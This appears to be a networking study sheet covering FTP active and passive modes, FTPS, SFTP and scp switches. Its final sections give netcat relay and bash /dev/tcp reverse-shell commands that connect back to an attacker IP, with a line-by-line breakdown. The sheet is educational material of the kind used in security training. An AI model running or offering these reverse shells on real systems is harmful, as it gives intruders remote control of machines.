-------------------------------------------------------------------------------
FTP CHANNEL MODES: ACTIVE VS. PASSIVE TRADEOFFS
-------------------------------------------------------------------------------
Active FTP (Client Ephemeral -> Server 21 Control Channel)

Formula: Client listens on (Ephemeral High Port + 1) and sends "PORT N+1" command.

Execution: Server initiates data channel back (Server 20 -> Client Ephemeral+1).

Example: Client 1026 sends PORT 1027, server connects from 20 to client 1027.

Firewall/NAT Impact: High failure rate if client firewall/NAT blocks incoming server requests.

Passive FTP (Client Ephemeral -> Server 21 Control Channel)

Formula: Client issues "PASV" command over control channel.

Execution: Server opens a random high port and responds with connection criteria.

Data Channel: Client initiates data channel back (Client Ephemeral+2 -> Server Random High).

Firewall/NAT Impact: Client friendly, but leaves a broad block of high ports open on the server.
-------------------------------------------------------------------------------
FTPS ENCRYPTION SCHEMES (EXPLICIT VS. IMPLICIT)
-------------------------------------------------------------------------------
Explicit FTPS:

Initial connection starts in cleartext on standard control port 21.

Client issues an explicit command (e.g., AUTH) requesting a secure upgrade.

Renegotiates control channel over TLS/SSL; data channels upgraded dynamically.
-------------------------------------------------------------------------------
Implicit FTPS:

Session is entirely encrypted from inception.

Dedicated baseline assignments use TCP Port 990 for control and TCP Port 989 for data channel.

Client must complete a TLS/SSL handshake immediately upon connection or it fails.
-------------------------------------------------------------------------------
SFTP VS. FTP OVER SSH TUNNEL WARNING
-------------------------------------------------------------------------------
SFTP: A standalone extension of SSH v2.0 natively processing all transfers safely via Port 22.

FTP over SSH: NOT a secure protocol alternative. This configuration tunnels a normal cleartext FTP session across an SSH channel. ONLY the control channel (Port 21) becomes encrypted. The actual data channel spawned by the server remains completely in plaintext.

SCP FLAGS AND SYNTAX EXPRESSION REGISTRY
-------------------------------------------------------------------------------
Syntax Formula: scp [Switches] [Source_Path] [Destination_Path]

[ OPERATIONAL SWITCH REGISTRY ]
SWITCH  FUNCTIONAL OVERVIEW
-v      Verbose mode; outputs operational flow and debugging lines
-p      Preserves timestamps and drops estimated connection speeds/metrics
-P      Specifies alternate remote host port connection (MUST be capital 'P')
-C      Enables stream compression to accelerate runtime transfers
-l      Limits pipeline bandwidth (Calculated in bits; e.g., 100KB/s = parameter 800)
-r      Recursively targets and transfers an entire local/remote directory tree
-3      Routes transfers between two remote targets directly through local host

BIDIRECTIONAL NETCAT RELAYS (NAMED PIPE SETUP)
-------------------------------------------------------------------------------
Standard unnamed pipes (|) cannot share data or handle bidirectional flows between unrelated system processes. To create middle-man pivots, build a Named Pipe (FIFO) file:

Named Pipe Creation:   mkfifo mypipe   -OR-   mknod mypipe p

-------------------------------------------------------------------------------

Attacker Listener (First):  nc -lvp 9999

Alternate Linux Execution:   nc -c /bin/bash [Attacker_IP] 9999
-------------------------------------------------------------------------------
[ INTERACTIVE BASH /DEV/TCP REVERSE SHELLS ]
-------------------------------------------------------------------------------
Fully interactive shell injection blueprint without deploying auxiliary packages:

Attacker Listener (First):  nc -lvp 9999

Target LotL Execution:      /bin/bash -i > /dev/tcp/[Attacker_IP]/9999 0<&1 2>&1
-------------------------------------------------------------------------------
[ DESCRIPTOR SYNTAX ANATOMY BREAKDOWN ]
-------------------------------------------------------------------------------
/bin/bash  = Points to the local native shell binary executable path.

-i         = Flags execution to run an Interactive terminal shell instance.

> /dev/tcp = Pipes stdout (1) directly into the outbound network socket connection.

0<&1       = Duplicates file descriptor 1 to standard input (0), locking control inputs.

2>&1       = Redirects all stderr (2) to stdout (1), passing errors out to the listener stream.
